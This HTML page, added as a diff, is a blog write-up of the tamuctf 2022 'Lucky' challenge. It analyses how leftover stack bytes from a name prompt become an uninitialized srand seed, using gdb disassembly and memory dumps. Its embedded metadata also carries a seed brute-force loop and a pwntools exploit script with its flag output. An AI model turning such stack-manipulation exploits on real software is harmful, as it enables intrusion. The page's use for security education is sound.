@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>tamuctf 2022 - Lucky | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="ctf, tamuctf, pwn, cybersecurity">
+<meta name="description" content="tamuctf 2022: Lucky
+Author: nhwn
+Feeling lucky? I have just the challenge for you :D
+Reference
+I could not solve this on my own so I had to refer to this writeup:
+https://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void welcome() {
+    char buf[16];
+    printf(&#34;Enter your name: &#34;);
+    fgets(buf, sizeof(buf), stdin);
+    printf(&#34;\nWelcome, %s\nIf you&#39;re super lucky, you might get a flag! &#34;, buf);
+}
+
+int seed() {
+    char msg[] = &#34;GLHF :D&#34;;
+    printf(&#34;%s\n&#34;, msg);
+    int lol;
+    return lol;
+}
+
+void win() {
+    char flag[64] = {0};
+    FILE* f = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
+    fread(flag, 1, sizeof(flag), f);
+    printf(&#34;Nice work! Here&#39;s the flag: %s\n&#34;, flag);
+}
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    welcome();
+    srand(seed());
+
+    int key0 = rand() == 306291429;
+    int key1 = rand() == 442612432;
+    int key2 = rand() == 110107425;
+
+    if (key0 &amp;&amp; key1 &amp;&amp; key2) {
+        win();
+    } else {
+        printf(&#34;Looks like you weren&#39;t lucky enough. Better luck next time!\n&#34;);
+    }
+}
+In welcome() function, before fgets gets called, rbp-0x10 which is the address
+to buf is loaded into rax. I passed in aaaabaaacaaadaaaeaaafaaag, the
+buffer was filled with aaaabaaacaaadaa\0.">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2022-4-20-tamuctf2022-lucky/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2022-4-20-tamuctf2022-lucky/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2022-4-20-tamuctf2022-lucky/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="tamuctf 2022 - Lucky">
+  <meta property="og:description" content="tamuctf 2022: Lucky Author: nhwn
+Feeling lucky? I have just the challenge for you :D
+Reference I could not solve this on my own so I had to refer to this writeup:
+https://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky
+#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void welcome() { char buf[16]; printf(&#34;Enter your name: &#34;); fgets(buf, sizeof(buf), stdin); printf(&#34;\nWelcome, %s\nIf you&#39;re super lucky, you might get a flag! &#34;, buf); } int seed() { char msg[] = &#34;GLHF :D&#34;; printf(&#34;%s\n&#34;, msg); int lol; return lol; } void win() { char flag[64] = {0}; FILE* f = fopen(&#34;flag.txt&#34;, &#34;r&#34;); fread(flag, 1, sizeof(flag), f); printf(&#34;Nice work! Here&#39;s the flag: %s\n&#34;, flag); } int main() { setvbuf(stdout, NULL, _IONBF, 0); welcome(); srand(seed()); int key0 = rand() == 306291429; int key1 = rand() == 442612432; int key2 = rand() == 110107425; if (key0 &amp;&amp; key1 &amp;&amp; key2) { win(); } else { printf(&#34;Looks like you weren&#39;t lucky enough. Better luck next time!\n&#34;); } } In welcome() function, before fgets gets called, rbp-0x10 which is the address to buf is loaded into rax. I passed in aaaabaaacaaadaaaeaaafaaag, the buffer was filled with aaaabaaacaaadaa\0.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-04-20T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-04-20T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Tamuctf">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Cybersecurity">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="tamuctf 2022 - Lucky">
+<meta name="twitter:description" content="tamuctf 2022: Lucky
+Author: nhwn
+Feeling lucky? I have just the challenge for you :D
+Reference
+I could not solve this on my own so I had to refer to this writeup:
+https://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void welcome() {
+    char buf[16];
+    printf(&#34;Enter your name: &#34;);
+    fgets(buf, sizeof(buf), stdin);
+    printf(&#34;\nWelcome, %s\nIf you&#39;re super lucky, you might get a flag! &#34;, buf);
+}
+
+int seed() {
+    char msg[] = &#34;GLHF :D&#34;;
+    printf(&#34;%s\n&#34;, msg);
+    int lol;
+    return lol;
+}
+
+void win() {
+    char flag[64] = {0};
+    FILE* f = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
+    fread(flag, 1, sizeof(flag), f);
+    printf(&#34;Nice work! Here&#39;s the flag: %s\n&#34;, flag);
+}
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    welcome();
+    srand(seed());
+
+    int key0 = rand() == 306291429;
+    int key1 = rand() == 442612432;
+    int key2 = rand() == 110107425;
+
+    if (key0 &amp;&amp; key1 &amp;&amp; key2) {
+        win();
+    } else {
+        printf(&#34;Looks like you weren&#39;t lucky enough. Better luck next time!\n&#34;);
+    }
+}
+In welcome() function, before fgets gets called, rbp-0x10 which is the address
+to buf is loaded into rax. I passed in aaaabaaacaaadaaaeaaafaaag, the
+buffer was filled with aaaabaaacaaadaa\0.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "tamuctf 2022 - Lucky",
+      "item": "https://joonkim0625.github.io/posts/2022-4-20-tamuctf2022-lucky/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "tamuctf 2022 - Lucky",
+  "name": "tamuctf 2022 - Lucky",
+  "description": "tamuctf 2022: Lucky Author: nhwn\nFeeling lucky? I have just the challenge for you :D\nReference I could not solve this on my own so I had to refer to this writeup:\nhttps://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void welcome() { char buf[16]; printf(\u0026#34;Enter your name: \u0026#34;); fgets(buf, sizeof(buf), stdin); printf(\u0026#34;\\nWelcome, %s\\nIf you\u0026#39;re super lucky, you might get a flag! \u0026#34;, buf); } int seed() { char msg[] = \u0026#34;GLHF :D\u0026#34;; printf(\u0026#34;%s\\n\u0026#34;, msg); int lol; return lol; } void win() { char flag[64] = {0}; FILE* f = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); fread(flag, 1, sizeof(flag), f); printf(\u0026#34;Nice work! Here\u0026#39;s the flag: %s\\n\u0026#34;, flag); } int main() { setvbuf(stdout, NULL, _IONBF, 0); welcome(); srand(seed()); int key0 = rand() == 306291429; int key1 = rand() == 442612432; int key2 = rand() == 110107425; if (key0 \u0026amp;\u0026amp; key1 \u0026amp;\u0026amp; key2) { win(); } else { printf(\u0026#34;Looks like you weren\u0026#39;t lucky enough. Better luck next time!\\n\u0026#34;); } } In welcome() function, before fgets gets called, rbp-0x10 which is the address to buf is loaded into rax. I passed in aaaabaaacaaadaaaeaaafaaag, the buffer was filled with aaaabaaacaaadaa\\0.\n",
+  "keywords": [
+    "ctf", "tamuctf", "pwn", "cybersecurity"
+  ],
+  "articleBody": "tamuctf 2022: Lucky Author: nhwn\nFeeling lucky? I have just the challenge for you :D\nReference I could not solve this on my own so I had to refer to this writeup:\nhttps://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky\n#include #include void welcome() { char buf[16]; printf(\"Enter your name: \"); fgets(buf, sizeof(buf), stdin); printf(\"\\nWelcome, %s\\nIf you're super lucky, you might get a flag! \", buf); } int seed() { char msg[] = \"GLHF :D\"; printf(\"%s\\n\", msg); int lol; return lol; } void win() { char flag[64] = {0}; FILE* f = fopen(\"flag.txt\", \"r\"); fread(flag, 1, sizeof(flag), f); printf(\"Nice work! Here's the flag: %s\\n\", flag); } int main() { setvbuf(stdout, NULL, _IONBF, 0); welcome(); srand(seed()); int key0 = rand() == 306291429; int key1 = rand() == 442612432; int key2 = rand() == 110107425; if (key0 \u0026\u0026 key1 \u0026\u0026 key2) { win(); } else { printf(\"Looks like you weren't lucky enough. Better luck next time!\\n\"); } } In welcome() function, before fgets gets called, rbp-0x10 which is the address to buf is loaded into rax. I passed in aaaabaaacaaadaaaeaaafaaag, the buffer was filled with aaaabaaacaaadaa\\0.\nDump of assembler code for function welcome: 0x00005555555551a5 \u003c+0\u003e:\tpush rbp 0x00005555555551a6 \u003c+1\u003e:\tmov rbp,rsp 0x00005555555551a9 \u003c+4\u003e:\tsub rsp,0x10 # grow stack by 16 bytes 0x00005555555551ad \u003c+8\u003e:\tlea rdi,[rip+0xe54] # 0x555555556008 0x00005555555551b4 \u003c+15\u003e:\tmov eax,0x0 0x00005555555551b9 \u003c+20\u003e:\tcall 0x555555555050 0x00005555555551be \u003c+25\u003e:\tmov rdx,QWORD PTR [rip+0x2ebb] # 0x555555558080 0x00005555555551c5 \u003c+32\u003e:\tlea rax,[rbp-0x10] 0x00005555555551c9 \u003c+36\u003e:\tmov esi,0x10 0x00005555555551ce \u003c+41\u003e:\tmov rdi,rax 0x00005555555551d1 \u003c+44\u003e:\tcall 0x555555555070 # rbp-0x10 which is 0x7fffffffe160 points to the start of the string input # from the command line aaaabaaacaaadaa =\u003e 0x00005555555551d6 \u003c+49\u003e:\tlea rax,[rbp-0x10] 0x00005555555551da \u003c+53\u003e:\tmov rsi,rax # put the result as the second # argument to printf 0x00005555555551dd \u003c+56\u003e:\tlea rdi,[rip+0xe3c] # 0x555555556020 # rdi has the whole string that gets printed to the screen 0x00005555555551e4 \u003c+63\u003e:\tmov eax,0x0 0x00005555555551e9 \u003c+68\u003e:\tcall 0x555555555050 # once printf gets called, the string now contains the buf 0x00005555555551ee \u003c+73\u003e:\tnop 0x00005555555551ef \u003c+74\u003e:\tleave 0x00005555555551f0 \u003c+75\u003e:\tret When I printed out info frame for welcome function, it gave me:\nStack level 0, frame at 0x7fffffffe180: rip = 0x5555555551b4 in welcome; saved rip = 0x5555555552df called by frame at 0x7fffffffe1a0 Arglist at 0x7fffffffe170, args: Locals at 0x7fffffffe170, Previous frame's sp is 0x7fffffffe180 Saved registers: rbp at 0x7fffffffe170, rip at 0x7fffffffe178 So, the base pointer is at 170. Once fgets returns, its return values goes into rax and rax has 15 bytes of characters aaaabaaacaaadaa and one bye of null character. When the flow returns to the main function before calling seed function, rsi still has the output that was used by the welcome function (later I figured this didn’t really matter).\nDump of assembler code for function seed: 0x00005555555551f1 \u003c+0\u003e:\tpush rbp 0x00005555555551f2 \u003c+1\u003e:\tmov rbp,rsp 0x00005555555551f5 \u003c+4\u003e:\tsub rsp,0x10 0x00005555555551f9 \u003c+8\u003e:\tmovabs rax,0x443a2046484c47 0x0000555555555203 \u003c+18\u003e:\tmov QWORD PTR [rbp-0xc],rax 0x0000555555555207 \u003c+22\u003e:\tlea rax,[rbp-0xc] # this instruction overwrites some of the characters of aaaabaaacaaadaa # so, before, it was: # 0x7fffffffe160:\t0x61\t0x61\t0x61\t0x61\t0x62\t0x61\t0x61\t0x61 # 0x7fffffffe168:\t0x63\t0x61\t0x61\t0x61\t0x64\t0x61\t0x61\t0x00 # but after: # 0x7fffffffe160:\t0x61\t0x61\t0x61\t0x61\t0x47\t0x4c\t0x48\t0x46 # 0x7fffffffe168:\t0x20\t0x3a\t0x44\t0x00\t0x64\t0x61\t0x61\t0x00 0x000055555555520b \u003c+26\u003e:\tmov rdi,rax 0x000055555555520e \u003c+29\u003e:\tcall 0x555555555030 # printf is replaced with puts by the compiler 0x0000555555555213 \u003c+34\u003e:\tmov eax,DWORD PTR [rbp-0x4] # this is where eax contains the return value of `lol` variable # rbp is 0x7fffffffe170 and subtracting 4 bytes gives us # 0x7fffffffe16c which I belive the start of `int lol` variable # if you examine the next four bytes from 0x7fffffffe16c, you can see # 0x7fffffffe16c:\t0x64\t0x61\t0x61\t0x00 # this is 'daa' which is the last three characters from the stdin we entered earlier # (of course, this is shown with the little-endian format) # now we know that we can try to manipulate these four bytes with the value # that would make the condition satisfy so it would execute the win func =\u003e 0x0000555555555216 \u003c+37\u003e:\tleave 0x0000555555555217 \u003c+38\u003e:\tret Since srand() is dictated by the return value of seed(), we would want to overwrite/manipulate the return value of seed() somehow.\nWhen seed() is being called and run, rsp ~ rsp+16 bytes still has some of the leftover strings from the win function and GLHF :D.\npwndbg\u003e x/16cb $rsp 0x7fffffffe160:\t97 'a'\t97 'a'\t97 'a'\t97 'a'\t71 'G'\t76 'L'\t72 'H'\t70 'F' 0x7fffffffe168:\t32 ' '\t58 ':'\t68 'D'\t0 '\\000'\t100 'd'\t97 'a'\t97 'a'\t0 '\\000' And, again, before the seed function returns, eax has 0x616164 which is daa in little-endian format.\nNow, we need to know the seed value that will satisfy the if condition to execute the win function.\nint key0 = rand() == 306291429; int key1 = rand() == 442612432; int key2 = rand() == 110107425; if (key0 \u0026\u0026 key1 \u0026\u0026 key2) { win(); } int i = 0; while (1) { srand(i); int key0 = rand() == 306291429; int key1 = rand() == 442612432; int key2 = rand() == 110107425; if (key0 \u0026\u0026 key1 \u0026\u0026 key2) { printf(\"seed = %i\", i); exit(0); } else { i++; } After running the program, we know that the seed value must be 5649426. And we know daa is where we need to put the seed value in.\n12 bytes of string + 5649426\nWe can create a short python script that does this for us.\nimport pwn elf = pwn.context.binary = pwn.ELF(\"./lucky\") #p = pwn.remote(\"tamuctf.com\", 433, ssl=True, sni=\"lucky\") p = pwn.process([\"./lucky\"]) payload = b'A'*12 payload += pwn.p64(5649426) p.sendline(payload) p.interactive() Result:\n[+] Starting local process './lucky': pid 132488 [*] Switching to interactive mode [*] Process './lucky' stopped with exit code 0 (pid 132488) Enter your name: Welcome, AAAAAAAAAAAA\\x12V If you're super lucky, you might get a flag! GLHF :D Nice work! Here's the flag: flag ",
+  "wordCount" : "977",
+  "inLanguage": "en",
+  "datePublished": "2022-04-20T00:00:00Z",
+  "dateModified": "2022-04-20T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2022-4-20-tamuctf2022-lucky/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      tamuctf 2022 - Lucky
+    </h1>
+    <div class="post-meta"><span title='2022-04-20 00:00:00 +0000 UTC'>April 20, 2022</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="tamuctf-2022-lucky">tamuctf 2022: Lucky<a hidden class="anchor" aria-hidden="true" href="#tamuctf-2022-lucky">#</a></h1>
+<p>Author: nhwn</p>
+<p>Feeling lucky? I have just the challenge for you :D</p>
+<h2 id="reference">Reference<a hidden class="anchor" aria-hidden="true" href="#reference">#</a></h2>
+<p>I could not solve this on my own so I had to refer to this writeup:</p>
+<p><a href="https://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky">https://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">welcome</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">16</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter your name: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf), stdin);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Welcome, %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">If you&#39;re super lucky, you might get a flag! &#34;</span>, buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">seed</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> msg[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GLHF :D&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, msg);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> lol;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> lol;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">64</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>    FILE<span style="color:#f92672">*</span> f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fread</span>(flag, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">sizeof</span>(flag), f);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Nice work! Here&#39;s the flag: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, flag);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">welcome</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">srand</span>(<span style="color:#a6e22e">seed</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> key0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">306291429</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> key1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">442612432</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> key2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">110107425</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (key0 <span style="color:#f92672">&amp;&amp;</span> key1 <span style="color:#f92672">&amp;&amp;</span> key2) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">win</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Looks like you weren&#39;t lucky enough. Better luck next time!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In <code>welcome()</code> function, before <code>fgets</code> gets called, <code>rbp-0x10</code> which is the address
+to <code>buf</code> is loaded into <code>rax</code>. I passed in <code>aaaabaaacaaadaaaeaaafaaag</code>, the
+buffer was filled with <code>aaaabaaacaaadaa\0</code>.</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">Dump of assembler code for function welcome:
+   0x00005555555551a5 &lt;+0&gt;:	push   rbp
+   0x00005555555551a6 &lt;+1&gt;:	mov    rbp,rsp
+   0x00005555555551a9 &lt;+4&gt;:	sub    rsp,0x10 # grow stack by 16 bytes
+   0x00005555555551ad &lt;+8&gt;:	lea    rdi,[rip+0xe54]        # 0x555555556008
+   0x00005555555551b4 &lt;+15&gt;:	mov    eax,0x0
+   0x00005555555551b9 &lt;+20&gt;:	call   0x555555555050 &lt;printf@plt&gt;
+   0x00005555555551be &lt;+25&gt;:	mov    rdx,QWORD PTR [rip+0x2ebb]        # 0x555555558080 &lt;stdin@@GLIBC_2.2.5&gt;
+   0x00005555555551c5 &lt;+32&gt;:	lea    rax,[rbp-0x10] 
+   0x00005555555551c9 &lt;+36&gt;:	mov    esi,0x10 
+   0x00005555555551ce &lt;+41&gt;:	mov    rdi,rax
+   0x00005555555551d1 &lt;+44&gt;:	call   0x555555555070 &lt;fgets@plt&gt;
+   # rbp-0x10 which is 0x7fffffffe160 points to the start of the string input
+   # from the command line aaaabaaacaaadaa
+=&gt; 0x00005555555551d6 &lt;+49&gt;:	lea    rax,[rbp-0x10]
+   0x00005555555551da &lt;+53&gt;:	mov    rsi,rax # put the result as the second
+                                             # argument to printf
+   0x00005555555551dd &lt;+56&gt;:	lea    rdi,[rip+0xe3c]        # 0x555555556020
+   # rdi has the whole string that gets printed to the screen
+   0x00005555555551e4 &lt;+63&gt;:	mov    eax,0x0
+   0x00005555555551e9 &lt;+68&gt;:	call   0x555555555050 &lt;printf@plt&gt;
+   # once printf gets called, the string now contains the buf 
+   0x00005555555551ee &lt;+73&gt;:	nop
+   0x00005555555551ef &lt;+74&gt;:	leave
+   0x00005555555551f0 &lt;+75&gt;:	ret
+</code></pre><p>When I printed out info frame for welcome function, it gave me:</p>
+<pre tabindex="0"><code>Stack level 0, frame at 0x7fffffffe180:
+ rip = 0x5555555551b4 in welcome; saved rip = 0x5555555552df
+ called by frame at 0x7fffffffe1a0
+ Arglist at 0x7fffffffe170, args:
+ Locals at 0x7fffffffe170, Previous frame&#39;s sp is 0x7fffffffe180
+ Saved registers:
+  rbp at 0x7fffffffe170, rip at 0x7fffffffe178
+</code></pre><p>So, the base pointer is at 170. Once fgets returns, its return values goes into
+<code>rax</code> and <code>rax</code> has 15 bytes of characters <code>aaaabaaacaaadaa</code> and one bye of null
+character. When the flow returns to the main function before calling <code>seed</code>
+function, <code>rsi</code> still has the output that was used by the welcome function
+(later I figured this didn&rsquo;t really matter).</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">Dump of assembler code for function seed:
+   0x00005555555551f1 &lt;+0&gt;:	push   rbp
+   0x00005555555551f2 &lt;+1&gt;:	mov    rbp,rsp
+   0x00005555555551f5 &lt;+4&gt;:	sub    rsp,0x10
+   0x00005555555551f9 &lt;+8&gt;:	movabs rax,0x443a2046484c47
+   0x0000555555555203 &lt;+18&gt;:	mov    QWORD PTR [rbp-0xc],rax
+   0x0000555555555207 &lt;+22&gt;:	lea    rax,[rbp-0xc]
+   # this instruction overwrites some of the characters of aaaabaaacaaadaa
+   # so, before, it was:
+   # 0x7fffffffe160:	0x61	0x61	0x61	0x61	0x62	0x61	0x61	0x61
+   # 0x7fffffffe168:	0x63	0x61	0x61	0x61	0x64	0x61	0x61	0x00
+   # but after:
+   # 0x7fffffffe160:	0x61	0x61	0x61	0x61	0x47	0x4c	0x48	0x46
+   # 0x7fffffffe168:	0x20	0x3a	0x44	0x00	0x64	0x61	0x61	0x00
+
+   0x000055555555520b &lt;+26&gt;:	mov    rdi,rax
+   0x000055555555520e &lt;+29&gt;:	call   0x555555555030 &lt;puts@plt&gt;
+   # printf is replaced with puts by the compiler
+   0x0000555555555213 &lt;+34&gt;:	mov    eax,DWORD PTR [rbp-0x4]
+   # this is where eax contains the return value of `lol` variable
+   # rbp is 0x7fffffffe170 and subtracting 4 bytes gives us 
+   # 0x7fffffffe16c which I belive the start of `int lol` variable
+   # if you examine the next four bytes from 0x7fffffffe16c, you can see
+   # 0x7fffffffe16c:	0x64	0x61	0x61	0x00
+   # this is &#39;daa&#39; which is the last three characters from the stdin we entered
+   earlier
+   # (of course, this is shown with the little-endian format)
+   # now we know that we can try to manipulate these four bytes with the value
+   # that would make the condition satisfy so it would execute the win func
+   
+=&gt; 0x0000555555555216 &lt;+37&gt;:	leave
+   0x0000555555555217 &lt;+38&gt;:	ret
+</code></pre><p>Since <code>srand()</code> is dictated by the return value of <code>seed()</code>, we would want to
+overwrite/manipulate the return value of <code>seed()</code> somehow.</p>
